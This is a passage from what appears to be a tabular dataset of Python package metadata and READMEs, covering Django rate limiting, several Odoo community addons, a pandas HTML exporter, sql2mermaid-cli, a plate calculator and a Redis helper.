    def get(self, request):
        pass
```

### anon_func_ratelimit:
Used for Anonymous user requests rate limiting for function base apis

```
class SampleView(APIView):
    @anon_func_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

## Middlewares

### UserRateLimitMiddleware

Add this django settings Middlewares for User rate limiting
```
MIDDLEWARE = [
    .
    .
    .
    .
    ""ratelimit.middleware.UserRateLimitMiddleware"",
]
```

### AnonRateLimitMiddleware

Add this django settings Middlewares for Anonymous rate limiting
```
MIDDLEWARE = [
    .
    .
    .
    .
    ""ratelimit.middleware.AnonRateLimitMiddleware"",
]
```",shaileshkumar123/django-ns-ratelimit
odoo-addon-stock-move-line-reserved-quant,https://github.com/OCA/stock-logistics-workflow,1,3345,2902,"==============================
Stock Move Line Reserved Quant
==============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-workflow/tree/16.0/stock_move_line_reserved_quant
    :alt: OCA/stock-logistics-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-workflow-16-0/stock-logistics-workflow-16-0-stock_move_line_reserved_quant
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/154/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to store on stock move line level (when reserving quantities
on movement level) the reserved quant.

For instance, this allows to filter the locations based on the quant properties
(lot, ...) being transfered to a particular destination location
(e.g.: see stock_storage_type module).

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/stock-logistics-workflow/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/stock-logistics-workflow/issues/new?body=module:%20stock_move_line_reserved_quant%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* ACSONE SA/NV

Contributors
~~~~~~~~~~~~

* Denis Roussel <denis.roussel@acsone.eu>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-rousseldenis| image:: https://github.com/rousseldenis.png?size=40px
    :target: https://github.com/rousseldenis
    :alt: rousseldenis

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-rousseldenis| 

This module is part of the `OCA/stock-logistics-workflow <https://github.com/OCA/stock-logistics-workflow/tree/16.0/stock_move_line_reserved_quant>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","==============================
Stock Move Line Reserved Quant
==============================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-workflow/tree/16.0/stock_move_line_reserved_quant
    :alt: OCA/stock-logistics-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-workflow-16-0/stock-logistics-workflow-16-0-stock_move_line_reserved_quant
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/154/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to store on stock move line level (when reserving quantities
on movement level) the reserved quant.

For instance, this allows to filter the locations based on the quant properties
(lot, ...) being transfered to a particular destination location
(e.g.: see stock_storage_type module).

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* ACSONE SA/NV

Contributors
~~~~~~~~~~~~

* Denis Roussel 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-rousseldenis| image:: https://github.com/rousseldenis.png?size=40px
    :target: https://github.com/rousseldenis
    :alt: rousseldenis

Current `maintainer `__:

|maintainer-rousseldenis| 

This module is part of the `OCA/stock-logistics-workflow `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/stock-logistics-workflow
lpython-emulation,https://github.com/Shaikh-Ubaid/lpython_packages,0,88,88,"# lpython_emulation

This is a python package to add typing information to python code.
","# lpython_emulation

This is a python package to add typing information to python code.
",shaikh-ubaid/lpython_packages
a-pandas-ex-df2htmlstring,https://github.com/hansalemaos/a_pandas_ex_df2htmlstring,3,2192,2192,"# exports pandas DataFrames/Series as HTML (formatted string that looks like a table!)

### pip install a-pandas-ex-df2htmlstring

#### Tested against Windows 10 / Python 3.10 / Anaconda


![](https://github.com/hansalemaos/screenshots/raw/main/pandasstringhtml.png)



### How to use it

```python
from a_pandas_ex_df2htmlstring import pd_add_df2htmlstring

pd_add_df2htmlstring()
import pandas as pd
from random import choice

csvtests = [
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_long.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_no2.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_no2_long.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_parameters.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_pm25_long.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_stations.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/baseball.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/titanic.csv"",
]
csvfile = choice(csvtests)
df = pd.read_csv(csvfile)
outfile = ""e:\\outputhtml.html""
df.ds_2htmlstring(
    outputfile=outfile, fontsize=12, fontcolor=""black"", repeat_columns_n_rows=70
)
os.startfile(outfile)
df.Name.ds_2htmlstring(
    outputfile=outfile, fontsize=12, fontcolor=""black"", repeat_columns_n_rows=70
)


Converts a pandas DataFrame to an HTML string with customizable font size, font color, and repeated column headers.

Args:
	df (pandas.DataFrame / pandas.Series): The DataFrame to be converted to an HTML string. (automatically passed)
	outputfile (str, optional): The name of the output file to save the HTML string to. Defaults to None (won't be saved on HDD).
	fontsize (int, optional): The font size of the HTML string. Defaults to 12.
	fontcolor (str, optional): The font color of the HTML string. Defaults to ""black"".
	repeat_columns_n_rows (int, optional): The number of rows after which to repeat the column headers. Defaults to 70.

Returns:
	str: The HTML string representation of the DataFrame.

```
","# exports pandas DataFrames/Series as HTML (formatted string that looks like a table!)

### pip install a-pandas-ex-df2htmlstring

#### Tested against Windows 10 / Python 3.10 / Anaconda


![](https://github.com/hansalemaos/screenshots/raw/main/pandasstringhtml.png)



### How to use it

```python
from a_pandas_ex_df2htmlstring import pd_add_df2htmlstring

pd_add_df2htmlstring()
import pandas as pd
from random import choice

csvtests = [
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_long.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_no2.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_no2_long.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_parameters.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_pm25_long.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/air_quality_stations.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/baseball.csv"",
    ""https://github.com/pandas-dev/pandas/raw/main/doc/data/titanic.csv"",
]
csvfile = choice(csvtests)
df = pd.read_csv(csvfile)
outfile = ""e:\\outputhtml.html""
df.ds_2htmlstring(
    outputfile=outfile, fontsize=12, fontcolor=""black"", repeat_columns_n_rows=70
)
os.startfile(outfile)
df.Name.ds_2htmlstring(
    outputfile=outfile, fontsize=12, fontcolor=""black"", repeat_columns_n_rows=70
)


Converts a pandas DataFrame to an HTML string with customizable font size, font color, and repeated column headers.

Args:
	df (pandas.DataFrame / pandas.Series): The DataFrame to be converted to an HTML string. (automatically passed)
	outputfile (str, optional): The name of the output file to save the HTML string to. Defaults to None (won't be saved on HDD).
	fontsize (int, optional): The font size of the HTML string. Defaults to 12.
	fontcolor (str, optional): The font color of the HTML string. Defaults to ""black"".
	repeat_columns_n_rows (int, optional): The number of rows after which to repeat the column headers. Defaults to 70.

Returns:
	str: The HTML string representation of the DataFrame.

```
",hansalemaos/a_pandas_ex_df2htmlstring
socscikit,https://github.com/SOCIALSCIENCEai/socscikit,0,0,0,,,socialscienceai/socscikit
qtapputils,https://github.com/jnsebgosselin/qtapputils,2,90,90,"The qtapputils module provides various utilities for building Qt applications in Python.
","The qtapputils module provides various utilities for building Qt applications in Python.
",jnsebgosselin/qtapputils
odoo14-addon-product-fao-fishing,https://github.com/OCA/community-data-files,1,3243,2881,"===================
Product FAO Fishing
===================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fcommunity--data--files-lightgray.png?logo=github
    :target: https://github.com/OCA/community-data-files/tree/14.0/product_fao_fishing
    :alt: OCA/community-data-files
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/community-data-files-14-0/community-data-files-14-0-product_fao_fishing
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/101/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends the functionality of product module to allow to set some
data related to fishing areas and capture technologies as attributes.

**Table of contents**

.. contents::
   :local:

Configuration
=============

#. Go to *Sales > Configuration > Products > Attribute Values*

   * Update fish FAO areas if you want

Usage
=====

#. Go to *Sales > Configuration > Settings*

   * Active ""Variants and Options"" and apply changes
#. Go to *Sales > Products > Products*

   * In *Variants* tab you can add *FAO Fishing Areas* attribute and select an
     attribute value.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/community-data-files/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/community-data-files/issues/new?body=module:%20product_fao_fishing%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~

* `Tecnativa <https://www.tecnativa.com>`_:

  * Sergio Teruel
  * Ernesto Tejeda

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/community-data-files <https://github.com/OCA/community-data-files/tree/14.0/product_fao_fishing>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","===================
Product FAO Fishing
===================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fcommunity--data--files-lightgray.png?logo=github
    :target: https://github.com/OCA/community-data-files/tree/14.0/product_fao_fishing
    :alt: OCA/community-data-files
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/community-data-files-14-0/community-data-files-14-0-product_fao_fishing
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/101/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends the functionality of product module to allow to set some
data related to fishing areas and capture technologies as attributes.

**Table of contents**

.. contents::
   :local:

Configuration
=============

#. Go to *Sales > Configuration > Products > Attribute Values*

   * Update fish FAO areas if you want

Usage
=====

#. Go to *Sales > Configuration > Settings*

   * Active ""Variants and Options"" and apply changes
#. Go to *Sales > Products > Products*

   * In *Variants* tab you can add *FAO Fishing Areas* attribute and select an
     attribute value.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~

* `Tecnativa `_:

  * Sergio Teruel
  * Ernesto Tejeda

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/community-data-files `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/community-data-files
sql2mermaid-cli,https://github.com/sattosan/sql2mermaid-cli,2,2404,2294,"<img src=""https://raw.githubusercontent.com/sattosan/sql2mermaid-cli/master/img/top-image.png"" width=""1200px"">

---

![PyPI - License](https://img.shields.io/pypi/l/sql2mermaid)
![GitHub Workflow Status (with event)](https://img.shields.io/github/actions/workflow/status/nkato/sql2mermaid/python-tox.yml?event=push&label=pytest%20with%20py38)
![PyPI](https://img.shields.io/pypi/v/sql2mermaid)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/sql2mermaid)

## sql2mermaid-cli
`sql2mermaid-cli` is a CLI tool that converts SQL query into [mermaid.js](https://mermaid.js.org/) style!.

![output-image](https://user-images.githubusercontent.com/20574756/235055268-3ecf0ec7-a3b7-45c3-93d9-fb032b14b4f6.gif)

## Required

Python >=3.8.1

## Installation

To install sql2mermaid-cli, use the following command:

```bash
$ pip install sql2mermaid-cli
```

## Getting Started

As a preparation, create a sample SQL file.

```bash
$ echo ""with bar as (select * from baz)\n\
select * from foo inner join bar on foo.id = bar.id\n""> input.sql
```

The basic usage of `sql2mermaid-cli` is as follows:

```bash
$ sql2mermaid-cli -i input.sql
```

This will output the mermaid diagram to the console:

```bash
graph LR

bar([bar])
root([root])

baz[(baz)]
foo[(foo)]

bar --> baz
root --> foo
root --> bar
```

The Mermaid diagram that is outputted can be visualized on the Mermaid Live Editor website.

[Mermaid Live Editor](https://mermaid.live/)


## Options

To save the output to a file, use the -o option followed by the path to the output file:

```bash
$ sql2mermaid-cli -i input.sql -o output.txt
```

By default, the output format is plain text. To output the mermaid diagram in markdown format, use the -m option:

```bash
$ sql2mermaid-cli -i input.sql -o output.md -m
```

You can also specify either ""upper"" or ""lower"" after the -d option to display the join type of SQL in the mermaid diagram.

```bash
$ sql2mermaid-cli -i input.sql -d upper
```

This will output the mermaid diagram to the console:

```bash
graph LR

bar([bar])
foo([foo])

root[(root)]
baz[(baz)]
foo.id[(foo.id)]
bar.id[(bar.id)]

bar -- FROM --> baz
bar -- FROM --> foo
foo -- INNER JOIN --> bar
```

## Author

- [sattosan](https://github.com/sattosan)

## License

This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/sattosan/sql2mermaid-cli/blob/master/LICENSE.md) for details
","

---

![PyPI - License](https://img.shields.io/pypi/l/sql2mermaid)
![GitHub Workflow Status (with event)](https://img.shields.io/github/actions/workflow/status/nkato/sql2mermaid/python-tox.yml?event=push&label=pytest%20with%20py38)
![PyPI](https://img.shields.io/pypi/v/sql2mermaid)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/sql2mermaid)

## sql2mermaid-cli
`sql2mermaid-cli` is a CLI tool that converts SQL query into [mermaid.js](https://mermaid.js.org/) style!.

![output-image](https://user-images.githubusercontent.com/20574756/235055268-3ecf0ec7-a3b7-45c3-93d9-fb032b14b4f6.gif)

## Required

Python >=3.8.1

## Installation

To install sql2mermaid-cli, use the following command:

```bash
$ pip install sql2mermaid-cli
```

## Getting Started

As a preparation, create a sample SQL file.

```bash
$ echo ""with bar as (select * from baz)\n\
select * from foo inner join bar on foo.id = bar.id\n""> input.sql
```

The basic usage of `sql2mermaid-cli` is as follows:

```bash
$ sql2mermaid-cli -i input.sql
```

This will output the mermaid diagram to the console:

```bash
graph LR

bar([bar])
root([root])

baz[(baz)]
foo[(foo)]

bar --> baz
root --> foo
root --> bar
```

The Mermaid diagram that is outputted can be visualized on the Mermaid Live Editor website.

[Mermaid Live Editor](https://mermaid.live/)


## Options

To save the output to a file, use the -o option followed by the path to the output file:

```bash
$ sql2mermaid-cli -i input.sql -o output.txt
```

By default, the output format is plain text. To output the mermaid diagram in markdown format, use the -m option:

```bash
$ sql2mermaid-cli -i input.sql -o output.md -m
```

You can also specify either ""upper"" or ""lower"" after the -d option to display the join type of SQL in the mermaid diagram.

```bash
$ sql2mermaid-cli -i input.sql -d upper
```

This will output the mermaid diagram to the console:

```bash
graph LR

bar([bar])
foo([foo])

root[(root)]
baz[(baz)]
foo.id[(foo.id)]
bar.id[(bar.id)]

bar -- FROM --> baz
bar -- FROM --> foo
foo -- INNER JOIN --> bar
```

## Author

- [sattosan](https://github.com/sattosan)

## License

This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/sattosan/sql2mermaid-cli/blob/master/LICENSE.md) for details
",sattosan/sql2mermaid-cli
gbx,https://github.com/gopherball/gbx,3,114,114,"![gb logo, a gopher in a ball](https://src.tty.cat/supakeen/gb/raw/branch/master/doc/_static/logo-doc.png)

# gbx
","![gb logo, a gopher in a ball](https://src.tty.cat/supakeen/gb/raw/branch/master/doc/_static/logo-doc.png)

# gbx
",gopherball/gbx
odoo14-addon-l10n-it-riba-sale-commission,https://github.com/OCA/l10n-italy,3,3891,3500,"====================================================
ITA - Integrazione tra RiBa e provvigioni su vendite
====================================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Alpha-red.png
    :target: https://odoo-community.org/page/development-status
    :alt: Alpha
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fl10n--italy-lightgray.png?logo=github
    :target: https://github.com/OCA/l10n-italy/tree/14.0/l10n_it_riba_sale_commission
    :alt: OCA/l10n-italy
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/l10n-italy-14-0/l10n-italy-14-0-l10n_it_riba_sale_commission
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/122/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

**Italiano**

Il modulo permette di integrare il pagamento RiBa con le provvigioni agenti.

Nella generazione delle provvigioni agente, una fattura con termini di pagamento
RiBa ed emissione con tipologia ""Salvo buon fine"" verrà presa in considerazione
solamente trascorsi il numero di giorni impostati nel campo ""Giorni di sicurezza""
nella configurazione RiBa.

È possibile impostare la spunta su ""Senza provvigioni"" nelle fatture, in modo
che non vengano generate provvigioni agente.

**English**

The module allows you to integrate the RiBa payment with agent commissions.

When generating agent commissions, an invoice with RiBa
payment terms and ""Subject To Collection"" type issue will be taken
into consideration only after the number of days set in the ""Safety Days"" field
in RiBa configuration.

It is possible to set ""Without commissions"" flag in invoices, in this way
no agent commissions are generated.

.. IMPORTANT::
   This is an alpha version, the data model and design can change at any time without warning.
   Only for development or testing purpose, do not use in production.
   `More details on development status <https://odoo-community.org/page/development-status>`_

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/l10n-italy/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/l10n-italy/issues/new?body=module:%20l10n_it_riba_sale_commission%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Nextev Srl

Contributors
~~~~~~~~~~~~

* Nextev Srl <odoo@nextev.it>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/l10n-italy <https://github.com/OCA/l10n-italy/tree/14.0/l10n_it_riba_sale_commission>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","====================================================
ITA - Integrazione tra RiBa e provvigioni su vendite
====================================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Alpha-red.png
    :target: https://odoo-community.org/page/development-status
    :alt: Alpha
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fl10n--italy-lightgray.png?logo=github
    :target: https://github.com/OCA/l10n-italy/tree/14.0/l10n_it_riba_sale_commission
    :alt: OCA/l10n-italy
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/l10n-italy-14-0/l10n-italy-14-0-l10n_it_riba_sale_commission
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/122/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

**Italiano**

Il modulo permette di integrare il pagamento RiBa con le provvigioni agenti.

Nella generazione delle provvigioni agente, una fattura con termini di pagamento
RiBa ed emissione con tipologia ""Salvo buon fine"" verrà presa in considerazione
solamente trascorsi il numero di giorni impostati nel campo ""Giorni di sicurezza""
nella configurazione RiBa.

È possibile impostare la spunta su ""Senza provvigioni"" nelle fatture, in modo
che non vengano generate provvigioni agente.

**English**

The module allows you to integrate the RiBa payment with agent commissions.

When generating agent commissions, an invoice with RiBa
payment terms and ""Subject To Collection"" type issue will be taken
into consideration only after the number of days set in the ""Safety Days"" field
in RiBa configuration.

It is possible to set ""Without commissions"" flag in invoices, in this way
no agent commissions are generated.

.. IMPORTANT::
   This is an alpha version, the data model and design can change at any time without warning.
   Only for development or testing purpose, do not use in production.
   `More details on development status `_

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Nextev Srl

Contributors
~~~~~~~~~~~~

* Nextev Srl 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/l10n-italy `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/l10n-italy
which-plates,https://github.com/iandday/whichPlates,1,1113,1039,"# which_plates

CI/CD Status:  
![Release](https://img.shields.io/github/v/release/iandday/whichPlates?color=brightgreen&sort=semver)
[![Linting](https://github.com/iandday/whichPlates/actions/workflows/lint.yml/badge.svg)](https://github.com/iandday/whichPlates/actions/workflows/lint.yml)
[![Testing](https://github.com/iandday/whichPlates/actions/workflows/test.yml/badge.svg)](https://github.com/iandday/whichPlates/actions/workflows/test.yml)
[![Documentation](https://github.com/iandday/whichPlates/actions/workflows/documentation.yml/badge.svg)](https://github.com/iandday/whichPlates/actions/workflows/documentation.yml)

<!-- Pytest Coverage Comment:Begin -->
<!-- Pytest Coverage Comment:End -->

Calculate weight and plates needed for each set based on one rep max weight

```code=bash
ian@Ians-MacBook-Pro whichPlates % which-plates
Bar Weight:45
One rep max:250
Percentages for each set, space separated: 50 65
Set 1 @ 50%: 125.0lbs, 80.0lbs in plates
     35: 2
     5: 2
Set 2 @ 65%: 165.0lbs, 120.0lbs in plates
     45: 2
     15: 2
Plates Needed:
     45: 2
     35: 2
     15: 2
     5: 2
```

","# which_plates

CI/CD Status:  
![Release](https://img.shields.io/github/v/release/iandday/whichPlates?color=brightgreen&sort=semver)
[![Linting](https://github.com/iandday/whichPlates/actions/workflows/lint.yml/badge.svg)](https://github.com/iandday/whichPlates/actions/workflows/lint.yml)
[![Testing](https://github.com/iandday/whichPlates/actions/workflows/test.yml/badge.svg)](https://github.com/iandday/whichPlates/actions/workflows/test.yml)
[![Documentation](https://github.com/iandday/whichPlates/actions/workflows/documentation.yml/badge.svg)](https://github.com/iandday/whichPlates/actions/workflows/documentation.yml)




Calculate weight and plates needed for each set based on one rep max weight

```code=bash
ian@Ians-MacBook-Pro whichPlates % which-plates
Bar Weight:45
One rep max:250
Percentages for each set, space separated: 50 65
Set 1 @ 50%: 125.0lbs, 80.0lbs in plates
     35: 2
     5: 2
Set 2 @ 65%: 165.0lbs, 120.0lbs in plates
     45: 2
     15: 2
Plates Needed:
     45: 2
     35: 2
     15: 2
     5: 2
```

",iandday/whichplates
vnkdj5-utils,https://github.com/vnkdj5/packages-tests,1,285,285,"# redis-singleton



## Installation

Start a redis via docker:

``` bash
docker run -p 6379:6379 -it redis/redis-stack:latest
```


To install vnkdj5-utils, simply:

``` bash
$ pip install vnkdj5-utils
```

## Example redis library

```
cache=Cache()


cache.set(""key"", ""val"")


```

","# redis-singleton



## Installation

Start a redis via docker:

``` bash
docker run -p 6379:6379 -it redis/redis-stack:latest
```


To install vnkdj5-utils, simply:

``` bash
$ pip install vnkdj5-utils
```

## Example redis library

```
cache=Cache()


cache.set(""key"", ""val"")


```

",vnkdj5/packages-tests
winavsos,https://github.com/Tomzy2506/AVSOS,15,0,0,,,tomzy2506/avsos
hydro-tune,https://github.com/S-Lab-System-Group/Hydro,0,0,0,,,s-lab-system-group/hydro
